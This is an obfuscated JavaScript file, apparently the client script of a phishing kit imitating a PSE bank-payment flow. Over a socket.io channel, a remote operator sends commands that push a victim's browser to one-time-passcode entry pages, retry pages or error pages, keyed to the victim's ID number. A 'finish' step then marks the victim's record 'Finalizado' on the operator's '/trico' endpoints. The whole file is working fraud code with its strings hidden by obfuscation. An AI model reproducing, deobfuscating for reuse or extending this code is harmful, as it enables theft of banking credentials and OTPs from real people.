const _0x248465 = _0x6ef5;
(function (_0x146f16, _0x575108) {
  const _0x3fe825 = _0x6ef5,
    _0x2ebaa4 = _0x146f16();
  while (!![]) {
    try {
      const _0x2f0a77 =
        -parseInt(_0x3fe825(0x158)) / 0x1 +
        -parseInt(_0x3fe825(0x170)) / 0x2 +
        (-parseInt(_0x3fe825(0x165)) / 0x3) *
          (-parseInt(_0x3fe825(0x15a)) / 0x4) +
        -parseInt(_0x3fe825(0x174)) / 0x5 +
        parseInt(_0x3fe825(0x167)) / 0x6 +
        (-parseInt(_0x3fe825(0x168)) / 0x7) *
          (-parseInt(_0x3fe825(0x173)) / 0x8) +
        -parseInt(_0x3fe825(0x16b)) / 0x9;
      if (_0x2f0a77 === _0x575108) break;
      else _0x2ebaa4["push"](_0x2ebaa4["shift"]());
    } catch (_0x1e520a) {
      _0x2ebaa4["push"](_0x2ebaa4["shift"]());
    }
  }
})(_0x5e27, 0x957ad);
var socket = io[_0x248465(0x169)](url);
socket["on"]("ps", function (_0x302f16) {
  const _0x751871 = _0x248465;
  if (
    _0x302f16["valor"] == _0x751871(0x16c) &&
    _0x302f16[_0x751871(0x166)] == info["metaInfo"]["cc"]
  )
    window[_0x751871(0x16a)][_0x751871(0x159)] = _0x751871(0x15f);
  else {
    if (
      _0x302f16["valor"] == "otp" &&
      _0x302f16[_0x751871(0x166)] == info[_0x751871(0x15c)]["cc"]
    )
      window["location"][_0x751871(0x159)] = _0x751871(0x161);
    else {
      if (
        _0x302f16[_0x751871(0x172)] == "newOtp" &&
        _0x302f16[_0x751871(0x166)] == info["metaInfo"]["cc"]
      )
        window[_0x751871(0x16a)]["href"] = _0x751871(0x15e);
      else {
        if (
          _0x302f16[_0x751871(0x172)] == _0x751871(0x15b) &&
          _0x302f16[_0x751871(0x166)] == info[_0x751871(0x15c)]["cc"]
        ) {
          async function _0x143485() {
            const _0x5947ce = _0x751871,
              _0x2f0b23 = await fetch(url + _0x5947ce(0x16d), {
                method: _0x5947ce(0x160),
                headers: { "Content-Type": _0x5947ce(0x16e) },
              }),
              _0xd8220e = await _0x2f0b23[_0x5947ce(0x16f)](),
              _0x336a6c = [..._0xd8220e];
            for (const _0x1e9306 of _0x336a6c) {
              if (_0x1e9306["id"] == info[_0x5947ce(0x15c)]["cc"]) {
                console[_0x5947ce(0x162)]("Usuario\x20encontrado");
                const _0x2728ae = await fetch(
                    url + _0x5947ce(0x163) + _0x1e9306[_0x5947ce(0x171)],
                    {
                      method: _0x5947ce(0x164),
                      headers: { "Content-Type": "application/json" },
                      body: JSON["stringify"]({ estado: "Finalizado" }),
                    }
                  ),
                  _0x51c8f1 = await _0x2728ae[_0x5947ce(0x16f)]();
              }
            }
            window[_0x5947ce(0x16a)]["href"] = _0x5947ce(0x15d);
          }
          _0x143485();
          return;
        }
      }
    }
  }
});
function _0x6ef5(_0xf352b6, _0x441213) {
  const _0x5e277d = _0x5e27();
  return (
    (_0x6ef5 = function (_0x6ef50f, _0x43a65f) {
      _0x6ef50f = _0x6ef50f - 0x158;
      let _0x178b98 = _0x5e277d[_0x6ef50f];
      return _0x178b98;
    }),
    _0x6ef5(_0xf352b6, _0x441213)
  );
}
function _0x5e27() {
  const _0x26e2e6 = [
    "application/json",
    "json",
    "503938xEKZYg",
    "idreg",
    "valor",
    "744ObdLPa",
    "2062425sBoXAw",
    "136975fQbpso",
    "href",
    "25804FwJMse",
    "finish",
    "metaInfo",
    "./errorPse.html",
    "./otp.error.html",
    "./index.error.html",
    "GET",
    "./otp.html",
    "log",
    "/trico/tricofinishPse/",
    "PUT",
    "321Wuzybl",
    "valid",
    "5373816sKUbot",
    "71239VSZLRY",
    "connect",
    "location",
    "10067904DVqajI",
    "user",
    "/trico/tricoData",
  ];
  _0x5e27 = function () {
    return _0x26e2e6;
  };
  return _0x5e27();
}
